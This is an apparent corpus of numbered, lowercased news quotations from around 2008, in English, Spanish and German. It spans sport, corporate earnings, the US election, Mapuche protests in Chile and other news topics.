8603696 we are obviously having to do it within our means there are a lot of players that might spring to mind when you are thinking about possible signings
8603697 but we have our own wage constraints to consider and obviously there are constraints with transfer fees too
8603698 i wasnt happy with the way we played in the first half and i gave the boys a bit of stick at half time we didnt hold the ball up well at all and we put ourselves under a lot of pressure
8603699 we gave the ball away far too often and that let brechin come on to us
8603700 its a huge blow for us mark picked up an injury at rugby park on saturday and we were obviously concerned about him at the time
8603701 but weve now been informed that he has suffered ligament damage and when thats the case then you are looking at around an eight week recovery period
8603702 now thats done sharif is showing his true colours he resigned from the governing coalition on monday in protest over the treatment of judges fired by musharraf last year
8603703 sharif is in effect setting himself up as a political martyr for democracy the ppp is worried most about the restoration of one judge iftikhar chaudhry
8603704 we have dramatic landscapes we have the sort of hills that you can walk up not just look at we have wide river valleys rolling hills and the brecon beacons we dont have the noise and the mess of a city the pace of life is something thats very relaxing within the county we dont have a single tesco though we have planning permission for one and we dont have m ands perhaps that helps
8603705 its one of the lowest earning areas in wales we may not earn much but we are obviously happy

8603710 well we dont know how much time we have left how many days months or years
8603711 even with the reduction in fuel prices over the last few weeks competitive pressure on fares and volumes will continue and we are at best expected to break even in the second half delivering a loss for the full year
8603712 it is now clear that we will require further fundamental changes in our base in order to minimise losses in 2009 and to help ensure the long term viability of the business
8603713 the seasonally weaker first half has been marked by extremely difficult market conditions in the form of unprecedented fuel costs slowing economic growth in our main markets and a weakness in dollar and sterling
8603714 fuel is the most significant cost within the business and the 56 5 million euro increase in our first half fuel costs contributed significantly to a loss
8603715 the losses were looking at in 2009 could be substantial
8603716 we would have an immigration policy that brings 12 million people out of the shadows
8603717 people are confused and lethargic not simply because they are tired of hearing the gospel or because they have never really been emotionally gripped by it but also because they are confused they have not heard the gospel in a way that provokes a thoughtful basement to attic reappraisal of themselves and their world

8603740 the slowdown in growth in the developed countries especially in the united states and the sharp upsurges in raw material prices started to take a toll on economic activity in israel in the second quarter of 2008
8603741 the crisis in the financial markets primarily in the united states has not passed over the israeli banking industry including the bank hapoalim group
8603742 in line with the strategy we adopted at the beginning of this year we have continued to take steps aimed at improving our capital adequacy ratio
8603743 bank hapoalim will pursue its accelerated business development process in israel and abroad and will continue to be a leading innovative bank providing its customers with the highest quality financial products and services in the market
8603744 the financial results for the second quarter of 2008 are affected by the first signs of a slowdown in economic activity in israel as a result of the crisis in global financial markets while at the same time they prove that the banks core business remains strong despite the losses incurred from the mbs crisis and especially considering the fact that this was the first quarter for which the bank ceased to collect management fees from provident funds a significant revenue source in the past
8603745 note that several factors weighed down our results including accounting asymmetries arising from differences between fair value and measurement on an accrual basis in credit derivatives as well as the fact that significant steps taken by the bank during the first half of the year are not expected to generate benefits until a later date
8603746 other significant measures were carried out during the first half of the year we concluded the sale of bank massad and bank yahav which generated profits for the bank and we stepped up preparations for the launch of pension advising activity
8603747 after putting behind us the mbs crisis albeit with a heavy price we continue to devote maximum energy on all fronts to realize the banks business plans and cope with the challenges of the future
8603748 century june 1900 theodore roosevelt warns against the politics of class
8603749 the prime lesson to be taught is the lesson of treating each man on his worth as a man and of remembering that while sometimes it is necessary from both a legislative and social standpoint to consider men as a class yet in the long run our safety lies in recognizing the individuals worth or lack of worth as the chief basis of action and in shaping our whole conduct and especially our political conduct accordingly it is impossible for a democracy to endure if the political lines are drawn to coincide with class lines the resulting government whether of the upper or the lower class is not a government of the whole people but a government of part of the people at the expense of the rest where the lines of political division are vertical the men of each occupation and of every social standing separating according to their vocations and principles the result is healthy and normal just so far however as the lines are drawn horizontally the result is unhealthy and in the long run disastrous for such a division means that men are pitted against one another in accordance with the blind and selfish interests of the moment
8603750 we have consistently used precision guided weapons to engage stationary threats with superb combat effects
8603751 this weapon allows our combat pilots to engage a broad range of moving targets with dramatically increased capabilities and it increases our ability to strike the enemy throughout a much much broader engagement envelope
8603752 at end game on aug 12 the team of the joint terminal attack controller alongside his ground unit commander in this event ensured all criteria were met for the first combat delivery of the ljdam and finally our f 16 pilot accurately and precisely delivered and guided the weapon to desired weapons effects the disabling and destruction of an enemy vehicle and personnel

8603794 i spoke to alex mcleish about him and hes had a terrific pre season hes scored five or six goals in pre season games and started the season scoring steven pressley went to watch him on saturday and hes a very good striker

8603797 in world cup games if its an injury they can play with they will
8603798 youre going to take little risks because its the biggest tournament in the world its the world cup
8603799 losing barry ferguson was a blow as was alan hutton but theres nothing we can do about it and weve got a good squad of players its been good for me to work with them for three friendlies which has given me more of a feel about what they can and what they cant do
8603800 ive got a view in my mind for the macedonia game over what the team is going to be
8603801 well be giving players every opportunity if they can play well be pushing it through
8603802 i think club managers realise that when its a world cup game its important that we get the best team we can out
8603803 you want your best players weve got two missing who would be automatic choices
8603804 theres no use whingeing about it no use making excuses about it no good worrying about it
8603805 weve got our squad of players its international football we cant go and buy one or bring one on loan

8603811 we all know that a police officer from outside the country doesnt have the powers of a peace officer here in b c
8603812 we had concerns about what are texas rangers doing stopping cars and engaging in active law enforcement in canada
8603813 unfortunately though the commission substantiated a lot of our complaint it didnt go that far as to say its bad policy for the rcmp to use foreign officers to enforce the law in canada
8603814 the delay was in excess of 18 months for a file in which the commissioner was in almost complete agreement
8603815 everything i learned in my eight years as president and in the work ive done since in america and across the globe has convinced me that barack obama is the man for this job
8603816 barack obama is ready to lead america and restore american leadership in the world ready to preserve protect and defend the constitution of the united states barack obama is ready to be president of the united states
8603817 hillary told us in no uncertain terms that shell do everything she can to elect barack obama that makes two of us
8603818 barack obama knows that america cannot be strong abroad unless we are strong at home
8603819 sounds familiar it didnt work in 1992 because we were on the right side of history and it wont work in 2008 because barack obama is on the right side of history

8603899 muy pocas han tenido alguna situaci n de conflicto en el pasado

8603902 en la octava y novena regi n son 1 500 comunidades mapuches
8603903 hay que mirarlo en su justa medida hay que darle la oportunidad a las polic as que trabajen tranquilas porque esta es una investigaci n de largo aliento no son investigaciones de un d a para otro para tener un resultado hay que tener paciencia

8603913 la gente aprecia lo que hice en el marat n de pek n
8603914 hopefully our players will prove that prediction wrong and i think were capable of proving it wrong
8603915 there are some really good quarterbacks in this league and i think the coaches and the offensive coordinators have done a good job getting players that really adapt to their style of play theyre different but you always feel like if you play a team with a good quarterback you have to play very well because they always have a chance to win for what we do on offense we think zac is great and were glad to have him
8603916 we really feel like we have two solid centers and three guards and three tackles and we have several young players on the offensive line that we think are going to be good players
8603917 thats our goal with the way were coming out in practice with the way were working hard its very achievable
8603918 the defense made a big stride in the spring a very big stride
8603919 i feel that when the season starts the offense and the defense will be clicking on all cylinders weve been working hard and we feel that we can be a very productive defense just like our offense
8603920 i definitely think it is more comfortable for the defense entering this season because everybody has adjusted to coach beckman more
8603921 hes also adjusted his schemes to fit our personalities better everybodys comfortable out there and everybodys having fun and when everybodys having fun it makes it a lot easier to go out there and practice hard
8603922 weve got a nice group of young freshmen that came in
8603923 like coach neil callaway said to us were 1 000 miles ahead of where we were last year at this time
8603924 im very excited about this team and the opportunities we have this year
8603925 we have a chance to accomplish some great things but i can tell you well be in a whole bunch of close football games just like we were last year and were going to have to win all of them
8603926 our kids walk onto the field and expect to win we expect to win championships we want to be conference usa champions and bowl champions and thats high expectations especially from where we were six years ago
8603927 we have a very very talented group of receivers i believe its one of the top 5 receiving groups in the country
8603928 schedule wise we have a challenging non conference including washington cincinnati and tcu which is as exciting as it is challenging and our guys realize that they are going have to be able to play early
8603929 the big 12 schedule is what it is i dont ever think from one year to the other that it is more difficult or any easier it is challenging and we have a lot of good football teams in the league and i think there are five in the top 14
8603930 there are a lot of good football teams so it will be as challenging as it always is
8603931 if you really look at it virtually every starter is back all of those guys have started in all those positions but we got to be more consistent
8603932 if they will be more consistent more physical and play at a higher level then it will give an opportunity to be physical and run the ball if we will protect the quarterback we will still throw it more efficiently and very well
8603933 we will find more ways to find him the ball and all the other guys that are there
8603934 to me the hardest thing to defend is when you use the whole field and use all of your people
8603935 i think the reason for the no huddle is to have more sense of urgency
8603936 i think that the pace of play with the 40 second clock is going to pick up for everybody
8603937 i think that is the most important for him is not to let the media the public or anyone to talk him into do something different than what you did
8603938 i thought he played as well as we could have asked for
8603939 he is stronger in the weight room and in the years of maturity he is a stronger guy i know he will be more comfortable in the position going through 14 games a year ago
8603940 demarco murray has a chance to be a really special player and he is just such a good athlete
8603941 i chose hats off to entertainment as the theme for the 2009 rose parade because the rose parade is a collection of america and the worlds great entertainers both past and present

8604032 we are ridiculous i know but we have such a wonderful time
8604033 you can achieve so much in your career and professional life but were so proud of the reading group its so fulfilling for us this recognition is quite incredible were absolutely gobsmacked and so proud
8604034 after a few glasses of wine its quite fun and it brings more to the books as it makes us fully experience them
8604035 fantastically diverse village groups prison groups school groups all different ages with different reasons for getting together
8604036 ali smith said to me that reading groups are the life blood of literary fiction in this country
8604037 fifty thousand groups of an average of 10 people reading a book once a month is a vast amount of books for literary fiction which traditionally has a small print run they are really important
8604038 a lot of the time reading groups start off as people who dont know each other very well and end up as really good friends you get the sense of that with lauras book group they have become really firm friends theyre a book group of lifestyle they do everything together
8604039 ja da haben sie nat rlich recht das steht ja auch hier so alles in der auftragsbest tigung und so da ist uns wohl ein fehler unterlaufen

8604047 these times require more than a good soldier they require a wise leader a leader who can change the change that everybody knows we need barack obama is going to deliver that change
8604048 lets declare together in one voice right here right now that barack obama is our candidate and he will be our president
8604049 everything i learned in my eight years as president and in the work i have done since in america and across the globe has convinced me that barack obama is the man for this job
8604050 i think what sen obama wants to do is make sure everyone watching at home is going to have a clear sense of where he wants to take the country that were on the wrong path and barack obama is going to put us back on the right track both here at home and overseas
8604051 this roman like facade a facade with roman columns is a perfect metaphor or icon for the point that its an interesting production but behind it theres not much there
8604052 my goodness its amazing that were three days into the democratic convention and 60 or so days from the actual election and theyre still trying to plead with the american people and convince us that barack obama is ready to be president
8604053 and it becomes obviously an even greater moment in november if hes elected
8604054 i have a dream that one day this nation will rise up and live out the true meaning of its creed we hold these truths to be self evident that all men are created equal
8604055 my fellow democrats america can do better than that and barack obama will do better than that
8604056 these times require more than a good soldier they require a wise leader
8604057 a leader who can change the change that everybody knows we need
8604058 everyone involved in irish tourism has acknowledged that our tourist trade is not immune to the challenging economic conditions in ireland and overseas particularly in some of our largest overseas source markets
8604059 nevertheless these figures from the cso show that over 3 7 million overseas visitors came to ireland in the first half of the year representing an increase of over 2 6 on the first six months of 2007
8604060 the north american numbers must be seen in the context of a record year for irish tourism last year consumer sentiment in the us fuel costs and the dollar euro exchange rate
8604061 i realise that these are half year figures only and indications are that tourism business particularly in some areas may have been less strong in july and august
8604062 from the consumers perspective however this means that there is exceptional value to be had in holidaying in ireland this year as a result
8604063 were introducing the service as a relatively easy way to get into open source
8604064 there are a lot of mixed messages out there users are confused about some of the issues handling legacy software the legal issues the perceived lack of support what were trying to do is counter that fud
8604065 theres no way that im ripping out everything that ive already installed
8604066 for example if an organisation wants to introduce samba theres plenty of excellent technical material on the web but we have 10 years experience in implementing samba in organisations and we could provide a lot of useful information
8604067 all en per hay un mejor clima laboral y un mejor control contra la violencia le est haciendo muy mal a chile esta idea de que a trav s de la violencia y de la ilegalidad los grupos de presi n pueden satisfacer sus demandas
8604068 ya quisiera alg n partido u ong tener tanta influencia
8604069 los pueblos ind genas no se oponen al desarrollo sino que quieren ser incluidos en sus propios t rminos y esto no comprende el gobierno
8604070 que es mucho m s peligroso que los decretos 1015 y 1073 e hizo un llamado a las comunidades del pa s para continuar la lucha por la derogatoria de estos otros decretos
8604071 si es necesario ir iremos nuevamente si es por m s carabineros m s carabineros mandaremos
8604072 la situaci n que afecta a las familias de nuestras comunidades lafkenche y pescadores artesanales que no han negociado con celco es producto de una pol tica que ha desarrollado el estado chileno para salvaguardar los intereses de privados por sobre los derechos humanos consagrados en la carta de las naciones unidas y en todos los pactos firmados por chile como el convenio 169 de la o i t o la declaraci n de las naciones unidas para los derechos de los pueblos ind genas
8604073 manifestamos nuestro repudio contra el estado chileno y sus aparatos policiales quienes ingresan a nuestras comunidades para allanarlas con violencia desmedida golpeando y disparando a nuestros ni os mujeres y ancianos destruyendo nuestras casas con la nica justificaci n de encontrar armamento y culparnos de actos de terroristas
8604074 hemos debido salir varias veces de nuestras casas junto a nuestras familias y ni os ya que en los allanamientos la polic a act a violentamente y nos golpean injustificadamente sin respetar a nadie
8604075 es por ello que el gobierno junto con hacerse parte en lo procesos judiciales para aclarar los hechos debe trabajar m s activamente en la soluci n de las hist ricas y presentes demandas sociales particularmente sobre las tierras mapuche
8604076 manifestamos nuestra condena categ rica a este hecho de violencia y esperamos que se realice una investigaci n acuciosa transparente y con pleno respeto a los derechos humanos para determinar qui nes fueron sus responsables
8604077 no obstante hacemos un llamado a no estigmatizar al pueblo mapuche a ra z de este hecho como lo han manifestado algunas autoridades y exigimos que estos lamentables sucesos no constituyan una nueva carta blanca para continuar con la pol tica gubernamental de criminalizar las protestas y reivindicaciones mapuches que ha terminado en violentos procedimientos policiales con saldos de personas heridas y muertas
8604078 viven preocupados del transantiago y no hacen nada con el transmapuche
8604079 manifestamos nuestro repudio contra el estado chileno y sus aparatos policiales quienes ingresan a nuestras comunidades para allanarlas con violencia desmedida golpeando y disparando a nuestros ni os mujeres y ancianos destruyendo nuestras casas con la nica justificaci n de encontrar armamento y culparnos de actos de terroristas
8604080 llamamos al gobierno a promulgar y depositar el convenio 169 de la oit sobre pueblos ind genas el que fuera aprobado por el congreso en marzo pasado y permanece inexplicablemente en el escritorio de la presidenta esperando su firma ello a pesar de que el ejecutivo conoce los procedimientos que este convenio establece para la resoluci n de conflictos por tierras como los que afectan a la comunidad de temucuicui
8604081 considerando que carabineros al momento de los allanamientos atacan indiscriminadamente al conjunto de la comunidad
8604082 hay que cambiar la forma de interdependencia entre los seres humanos y dar pie a relaciones nuevas donde la econom a se preocupe del ser humano

8604088 i was really excited about the way i was playing
8604089 to kind of end like that it was a little i guess disappointing
8604090 i wanted to try and bully the ball around and try and get on top of him early
8604091 i think it was pretty obvious who would be the best fit to help me out for just this tournament
8604092 it kind of freaks me out when they say my 17th time or 17 years or whatever
8604093 to be honest i think were a little scared to talk about what happens after here just because this has been such a focal point of my whole comeback
8604094 so we havent really decided its kind of like an unspoken thing hanging behind my husband and i
8604095 in that certain moment i felt big pain so i just had to tape the ankle he said
8604096 the emotions that i feel toward my countrymen id like to call it positive jealousy
8604097 it bugs me that they are 1 2 3 and im still 30 40 but if the guys i see grow up can make it so high i know that its difficult but it can be done
8604098 hes a fan favorite here because of his guile and his entertaining ways
8604099 id love for my progress to go a little bit faster
8604100 im in my prime there are no excuses that im young or something like that
8604101 when you see these top players are not as good as you think they are in your head
8604102 im sure the parents and family members talk about it a lot and im sure at home and things
8604103 but it is just a one game approach and the kids never hear anything about a winning streak from the coaches
8604104 wir rechnen damit dass sich mit der zertifizierung der salesforce admins und force com entwickler neue berufsbilder im bereich saas und paas entwickeln
8604105 diese eigeninitiative ist typisch f r die dynamik im saas und paas markt
8604106 bei dieser entwicklung reicht es nicht wenn allgemein an das energiebewusste verhalten von verbrauchern appelliert wird und gleichzeitig ger te ohne ausschaltknopf auf den markt kommen
8604107 wenn man die steigende bedeutung des gesch fts mit zusatzleistungen f r das wirtschaftliche ergebnis von herstellern und autoh usern betracht waren das schwache werte
8604108 die ergebnisse haben uns gezeigt dass die wahrnehmung von zusatzleistungen sich grunds tzlich ndern muss
8604109 deswegen geh rt die zukunft dem automobilhersteller der umfassend mobilit tsbezogene dienstleistungen anbieten kann
8604110 ich freue mich ber die positive entwicklung am arbeitsmarkt die weiterhin starke zunahme der besch ftigung und der r ckgang der arbeitslosigkeit sind die wichtigsten erfolge gemeinsamer anstrengungen in den letzten drei jahren gerade angesichts des gegenwinds aus dem weltwirtschaftlichen umfeld der uns jetzt zunehmend ins gesicht bl st zahlen sich die reformen der vergangenheit aus widerstandsf hig wird die besch ftigungsentwicklung aber nur dann bleiben wenn wir die binnennachfrage weiter st rken ein bescheidener staat und mehr netto in den taschen der b rger durch niedrigere steuern und abgaben das ist deshalb jetzt das gebotene signal das f rdert zuversicht und initiative der b rgerinnen und b rgern sowie der unternehmen und sichert so arbeit und einkommen
8604111 wir werden bei der n chsten winterolympiade in vancouver im jahre 2010 auch am start sein mit einem s chsischen haus
8604112 das saxony house in vancouver soll sachsen als gastfreundliches bundesland und herausragende sportregion in deutschland aber auch als attraktiven investitionsstandort und hochwertiges reiseziel pr sentieren
8604113 ergreifen sie die gelegenheit den nordamerikanischen markt f r unternehmen auf einer herausgehobenen plattform zu erschlie en damit nicht nur unsere sportler sondern auch alle anderen sachsen eine entscheidende rolle spielen
8604114 wir verlangen sehr viel von unserem avid ds system im verlauf einer woche m ssen wir an vielen verschiedenen projekten arbeiten von pal trailern bis zu tv serien und von effekt arbeiten bis zu 4 4 4 features die dann ausbelichtet werden als beta tester haben wir ein paar monate lang verschiedene projekte mit der neuen version von avid ds bearbeitet am meisten haben uns dabei die verbesserte performance die farbverwaltung und die neuen tools f r die sekund re farbkorrektur beeindruckt allein die tatsache dass wir alle effekte in echtzeit direkt in 4 4 4 haben spart uns unglaublich viel zeit schnelligkeit genauigkeit und einen gewissen style bei der ausf hrung egal um welches projekt es sich handelt oder wie knapp die deadline ist das erwarten unsere kunden von uns avid ds v10 ist daher die perfekte plattform um diese anspr che unserer kunden auch weiterhin zu erf llen

8604117 neither i nor my vets had ever heard of the drug felbinac until we got the call about myths positive test
8604118 we were stunned and baffled we spent the entire day doing internet research on the uses for this drug and how it could possibly have gotten into my horses system as far as we could find it is not even manufactured approved or available in the u s my horse has had no soundness problems whatsoever and i would have no need for an anti inflammatory anyone who knows me knows whole heartedly that i would never dope my horse intentionally it is cheating it is not putting your best against the others best i have never been in a more torturous and frustrating situation trying to prove innocence is very hard it saddens me beyond description that my whole reputation could be blackened because of this situation
8604119 there are circumstances in this case that makes it difficult to clear out how the prohibited substance entered into the horses system
8604120 the usef stands behind the feis initiatives to rid the sport of doping and to protect the welfare of our horses we are equally supportive of courtney in this situation as this substance was unknown to any of us until a few days ago
8604121 it seems clear that mythilus came into contact with it without courtneys or dr mitchells knowledge
8604122 in terms of fighters we are looking at jerome lebanner he is interested in doing mma and apparently him and tim sylvia have some history between them so that is something that we are looking at right now
8604123 all men are frauds the only difference between them is that some admit it i myself deny it
8604124 he is so desperate for attention that he goes to the media whenever possible
8604125 i am not the reason that he has no contact with his daughter i feel no need to publicly defend my role in lindsays life im just sorry that she likes me more than him

8604164 there has been silence on the domestic side about hiv aids
8604165 still see hiv aids as an epidemic that is affecting people in this country particularly minorities
8604166 at a point where weve had a great deal of experience with hiv aids
8604167 some things that we know work well there are some things we need to modify and change and there are some things we just shouldnt be a part of
8604168 strong protocols in how we implement care and treatment for those who are impacted by hiv aids
8604169 there had been suspicion that spies may mingle with north korean defectors
8604170 the suspicions have turned into reality for the first time with this case

8604176 in the us these diseases are defined as those which affect less than 2 00 000 patients or those for which cost of development is unlikely to be covered through commercialisation orphan drugs are thus used for rare diseases for which there is an unmet medical need
8604177 there is limited commercial opportunity for such drugs however research based pharma companies are able to apply their r amp d expertise in partnership with government and other medical institutes for orphan indications with unmet medical needs
8604178 the actions that we have taken over the course of the last weeks will go some way in giving us the greater resilience and greater ability to weather whatever storms the capital markets and property markets will throw at us in the balance of the year
8604179 the company was able to adjust the group bank covenant in a very favourable way which reduces the risk of potential company failure
8604180 c amp r is still facing a very challenging period with its relatively high loan to value of 61 percent but we believe management efforts have reduced the risk of serious trouble
8604181 although retail parks are a very interesting franchise the small number of investors in this fund do have investment alternatives
8604182 what we all want to do is protect value and a constant drip feed of assets to the market is not the best way to do that
8604183 we view this as a disappointing outcome for renovo as this sequential approach significantly pushes back potential product launch we now forecast launch in 2014 having previously assumed 2012 in addition we now believe the company will require further funding albeit not for a number of years
8604184 our financial results in recent years have mirrored the consistent improvement we have achieved in our business and we finish the year with a stronger business
8604185 we enter the new financial year facing slowing global growth and more challenging global
8604186 but given the strength and diversity of diageos business we believe we can deliver organic operating profit growth for the coming year within our range of 7 0 9 0 percent
8604187 the main drivers of growth were international where scotch in north america where growth in the priority brands drove a 5 0 percent increase in net sales
8604188 if it was going to have a major impact we would have seen it by now
8604189 we are making good progress with proposals for renegotiating the convertible bonds which we expect to announce shortly
8604190 weve been working to get this done in a reasonable way as soon as possible and we certainly expect to have something done way before the end of this year

8604210 whats at risk here is the role of well researched serious journalism to act as a check and balance in the system of democracy
8604211 online media can replace part of it the four websites im involved in employ 30 or 40 full time journalists which is quite a lot in independent media terms but compared with 300 or 400 journalists on big daily newspapers it is fairly small
8604212 need to look at it now and think if we dont do anything then in a decades time the idea of well resourced quality journalism with hundreds of journalists covering parliament and business and investigative journalism and the courts will be gone

8604252 the purpose of punitive damages is not to compensate a plaintiff but to punish and deter certain conduct
8604253 it was not an official trip our employees took a half day leave
8604254 freedom in the hands of such as these who want the freedom without the responsibility degenerates into a callous license to aspire to little more than gossipy headlines and inflated circulation numbers no matter what cost must be paid in the debasement of public discourse
8604255 journalists are critical to maintaining our strong democracy we need not overstress that
8604256 a cynical mercenary demagogic press will produce in time a people as base as itself
8604257 these are words of great precautionary value to those who seek shelter under the freedoms advanced by such as pulitzer and free press founder teodoro locsin sr but disdain the concurrent responsibilities on their part to be disinterested and public spirited

8604262 the agency simply gave us p300 and told us to fetch her body at the airport

8604266 said ken dychtwald president and ceo of age wave and one of the leading authorities on retirement and the aging population who collaborated with schwab on the study
8604267 with life expectancy increasing many fear that their current savings will not sustain them to pay for everyday needs throughout retirement
8604268 delaying retirement provides individuals the opportunity to further grow their personal portfolio
8604269 many retirees are entering new part time careers as both a new challenge within the workplace and a source of additional income
8604270 it appears that americans no longer view retirement as a time for rest and relaxation but rather a time for personal reinvention and continued productivity
8604271 as americans push the envelope on what it means to grow old and retire it seems natural that companies would embrace these new paradigms and offer more flexibility in work style and in the education tools and resources they offer employees

8604275 the thing thats interesting to almost everyone from the industry who walks in here is its all under roof

8604279 patriarchys chief institution is the family within which men hold the power to determine the privileges statuses and roles of women and children
8604280 such a structure is buttressed by traditional gender role ideology and is further institutionalized and reproduced in gendered power relationships throughout society
8604281 bias the choices of children toward some disputed or controversial ways of life and away from others
8604282 the dichotomy between the public and the private is ultimately what the feminist movement is about
8604283 families are private nonpolitical units whose interests subsume those of children
8604284 for hillary children are the levers by which one forces social change

8604294 es gente muy cerrada que no permite que muchos jugadores salgan del armario
8604295 los homosexuales no caben en el f tbol por actitud comportamiento exigencia y respeto
8604296 del dicho al hecho hay mucho trecho hay comportamientos pero concretos muy pocos
8604297 no hay gays en el f tbol no s si los jugadores est n en contra de tener a alguno en su equipo pero yo s lo estoy en los clubes en los que he trabajado nunca ha habido no he querido nunca un jugador homosexual y rechazar a todav a hoy fichar a alguno
8604298 hay futbolistas gays pero no lo declaran porque creen que no ser an aceptados en estas organizaciones de hombres pero el f tbol est abierto a todos hay una competici n espec fica y en el f tbol femenino es m s popular la homosexualidad
8604299 lamentablemente existe mucha homofobia en el mundo del deporte esto no lo asumimos para nada porque la condici n sexual no significa ning n impedimento para que un jugador sea marginado puede ser tan bueno como un homosexual
8604300 las de pinto son declaraciones que dentro de este mbito est n bien vistas porque es un terreno vedado para los que quieren salir del armario normalmente se entra en los t picos reiterados de que son travestis transexuales y que generar an problemas en el vestuario en los equipos se ensalza mucho el machismo las batallas y resulta ser que hay homosexuales en diferentes formas en todos los sitios

8604311 el plantel estaba dividido entre los refuerzos y los del club viajaron muchos chicos sin experiencia ni nivel para jugar recuerdo que era una tarde tranquila sin mucha gente en la cancha empez el partido la goleada y nos mir bamos asombrados nos bailaron tanto que entre muchos se terminaron puteando

8604315 no me es grato acordarme de ese partido aunque ahora estoy m s curado a veces los hermanos de mi esposa alicia carolina me hicieron algunos chistes pero yo me pon a serio y la cortaban igualmente no me siento el nico responsable es m s tan mal no me fue porque al finalizar el torneo me renovaron el contrato
8604316 sigo todo por tv a banfield lo volv a ver y salvo cuando juega con river nunca quise que perdiera porque no tengo ni le tuve ning n tipo de rencor
8604317 the peter de villiers game plan is all about adding decision making to structure and we are stuck at the moment at decision making
8604318 but i back the players and i want them to keep going out and playing whats in front of them the win will come because we have very good players
8604319 we dont have control over whether we win or lose and i treat winning or losing as the same
8604320 but we let the public down last week and we want them to feel part of a winning recipe
8604321 even if the military is firmly in charge of pakistans nuclear programme where is the civilian component in decision making
8604322 ultimately there will have to be evidence of a strong civilian oversight for the world to accept that we are moving in to a new and more reassuring phase maybe after president musharraf politicians gain enough clout in time that they become full partners in managing and securing the nuclear programme
8604323 there is no indication that the military does not exercise full control over pakistans nuclear assets

8604325 with a capital c it is what it is we are who we are
8604326 we need to put our foot on the throats of our opponents and put it there the whole game we lacked that last year we got a big lead and we got satisfied this year we dont want to get satisfied we have to play full force every minute
8604327 the players dont like each other they went to oregon we came to washington they wish they could have come to washington

8604332 its an opportunity to showcase the talent we have in our conference
8604333 whenever you have that opportunity i think its important you do well hopefully we can all play well
8604334 with the expectations through the roof for this football team i think theres a little bit of pressure
8604335 i hope we handle it better than we did last year when they started 0 2
8604336 you know what i actually ran into alabama freshman receiver julio jones in the spring recruiting i said hello to him and said i guess ill be seeing you at the end of august then he got out and got in his escalade and drove off thats being serious and then i went over and watched alabama freshman receiver burton scott at vigor ala high school at the track over there and burton scott was running around he went and got in his escalade out at track practice and drove off
8604337 i cant say strongly enough that i went back to make sure everyone that was there knew i was just kidding around i tried to make the effort to make sure that this didnt get the legs that you talked about i hope it doesnt cause any ill feelings with those kids thats the last thing you want i shouldnt have been kidding around
8604338 thats their strength and thats our strength its going to be a great matchup for us and them
8604339 it was a decision that me and my family had to make the coaches thought it would be best for me to redshirt than to play part time and get a year under my belt so i can be better physically and mentally it was hard at first but at the same time it was for the best
8604340 people are saying this is the kid who had all of the chances in the world and he blew it theyre right i wasnt doing what i was supposed to be doing people have this image of me that ive created and its up to me to change it
8604341 im not giving a lesson on accountancy but you do write money off over the term of a contract
8604342 what we pay is in an investment during that period you have a player who is doing a job and in this industry you buy and sell players
8604343 you have to look at these things pragmatically sometimes these things dont work as well as you want them to
8604344 remember we got deco for eight million pounds and that looks to be the buy of the season
8604345 for a century the agitation to preserve great works of art in british collections from export has been animated by anxiety that titians great paintings diana and actaeon and diana and callisto might be sold

8604386 the scale of this criminal enterprise is unprecedented in this country
8604387 the roll call of deaths and injuries is horrific some 30 to 40 of these weapons are still unaccounted for and regrettably but doubtlessly the roll call of death and serious injury will continue to rise
8604388 grant was expelled from beaconsfield secondary school in the fourth year probably age about 15 for persistent disruptive behaviour
8604389 he never went back to school after that he worked subsequently on building sites as a labourer but became involved in drug dealing which was what his first prison term was for as well as more thieving

8604393 its quite sad form me particularly with major zambrano if you remember the mission to brorongan where we brought relief goods for the first time zambrano was the one who flew it he was always smiling very bubbly
8604394 he said that he opted to stay in the philippine air force than join the airlines because here he was saving lives that was his character

8604399 here the queen of the island who had no children and was eager for a young prince to succeed to the throne discovered the babe which was very handsome and sending word throughout the land that she was with child had judas secretly nursed until she could proclaim him as her own
8604400 in spite of the queens remonstrances he continued to maltreat the true prince until finally in a fit of anger the queen made known to him his irregular origin
8604401 now although judas was ignorant of the fact the garden and the fruit were the possession of his own father reuben
8604402 the bride was extremely unhappy and sighed frequently being asked one day by her husband the cause of her grief she related enough of her story to enable judas to recognize his double crime of parricide and incest both were afflicted with great remorse but on cyboreas suggestion judas resolved to go to jesus and seek pardon and forgiveness he soon became a favorite disciple and was made steward of the twelve but again his evil nature asserted itself and he betrayed his master to the jews for thirty pieces of silver thereafter he again suffered remorse and having returned the money hanged himself
8604403 i guess from being in high school and i was able to actually talk to a teacher if i had an issue it was more of a one on one type situation
8604404 going from that to working online where i didnt have a teacher and if i did have a question i had to post a question for that day it was kind of hard in the sense where i didnt have people who were in the class with me to help me out

8604440 we are greatly strengthened and helped in this very difficult time by the expressions of sympathy and the kind comments about marks life and career made by so many people and in particular by the staff and cast of all saints channel 7 and his friends and colleagues
8604441 these remarks are greatly treasured and help us immensely in our terrible loss

8604445 mark was a talented and spirited student who continued to follow his passion for drama after leaving the college
8604446 mark was actively involved in the aquinas arts program including school musicals and drama productions
8604447 he was a highly committed and entertaining student who was awarded the cultural activities award in his final year
8604448 he was generous in sharing information about life in the industry
8604449 each year he came and spoke to our graduating actors and in may this year he and some of his fellow actors on all saints gave up their time on a saturday to come to nidas open day to talk about their time at nida their audition experiences and being an actor
8604450 mark priestley was a tremendous young person loved and respected by his fellow all saints cast members and crew
8604451 his work on stage and screen was admired by everybody who knew him
8604452 his death is such a sad loss we at channel seven will miss his energy and smile
8604453 our thoughts and prayers are with marks family and friends
8604454 we are greatly encouraged by our findings because the nearly half of the children on the diet were either able to maintain healthy cholesterol or gradually metabolized the extra fat and returned to somewhat normal cholesterol levels
8604455 this means the benefits of the diet a diet that is lifesaving in many children and therapeutic in most of them continue to outweigh the risks

8604495 i guess from being in high school and i was able to actually talk to a teacher if i had an issue it was more of a one on one type situation
8604496 going from that to working online where i didnt have a teacher and if i did have a question i had to post a question for that day it was kind of hard in the sense where i didnt have people who were in the class with me to help me out
8604497 i was still able to adjust fine and just roll with the punches
8604498 it was something different that i had to get used to
8604499 but being in a war zone and juggling college that wasnt easy
8604500 it was a decision i knew i had to make
8604501 i was in a war zone knowing that people were trying to hurt us
8604502 i was always calling her and telling her hey look into going back to school

8604511 people throw garbage in drains near their houses sometimes slides also occur when people dump their toilet wastes into the drains
8604512 the observance of the holy month of ramadan will be taken into account with great sensitivity by law enforcement elements as they enforce the law against those who have committed violations of the law
8604513 we will however not allow ramadan to be used as an occasion to escape responsibility
8604514 a total ceasefire is unacceptable because of the fact that we have a law to enforce
8604515 katos men are sniping at our men we have enough men on the ground so the rebels cannot retake their camps which we overran
8604516 i think there will be tactical adjustments it will depend upon the commander operating in one area
